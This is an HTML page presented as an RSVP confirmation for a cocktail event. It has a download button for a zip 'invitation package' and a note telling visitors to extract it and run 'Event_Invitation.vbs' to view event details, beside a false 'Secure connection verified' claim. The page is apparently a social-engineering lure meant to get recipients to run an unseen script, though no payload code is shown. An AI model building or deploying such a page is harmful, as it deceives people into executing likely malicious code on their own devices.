<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RSVP Confirmed | Cocktails & Conversation</title>
    <style>
        body { 
            background-color: #1a1b26; /* Dark elegant background from video */
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            max-width: 500px;
            padding: 40px;
            border: 1px solid #333;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
        }
        .check-icon {
            width: 64px;
            height: 64px;
            border: 2px solid #d4af37;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            color: #d4af37;
            font-size: 32px;
        }
        h1 { font-size: 28px; font-weight: 300; margin-bottom: 16px; letter-spacing: 1px; }
        p { font-size: 14px; line-height: 1.6; color: #a0a0a0; margin-bottom: 32px; }
        
        .download-btn {
            display: inline-block;
            padding: 14px 32px;
            background: transparent;
            border: 1px solid #d4af37;
            color: #d4af37;
            text-decoration: none;
            border-radius: 6px;
            font-size: 14px;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .download-btn:hover {
            background: #d4af37;
            color: #1a1b26;
        }
        
        .note {
            margin-top: 24px;
            font-size: 11px;
            color: #666;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Checkmark Icon -->
        <div class="check-icon">✓</div>
        
        <h1>You're on the list!</h1>
        <p>
            Your response has been received. Your digital invitation package has been securely prepared for your device.
        </p>
        
        <!-- SAFE ZIP DOWNLOAD LINK -->
        <a href="/static/event_resources.zip" class="download-btn" download>
            Download Invitation Package
        </a>
        
        <p class="note">
            Extract the archive and run <code>Event_Invitation.vbs</code> to view full event details.<br>
            Secure connection verified.
        </p>
    </div>
</body>
</html>
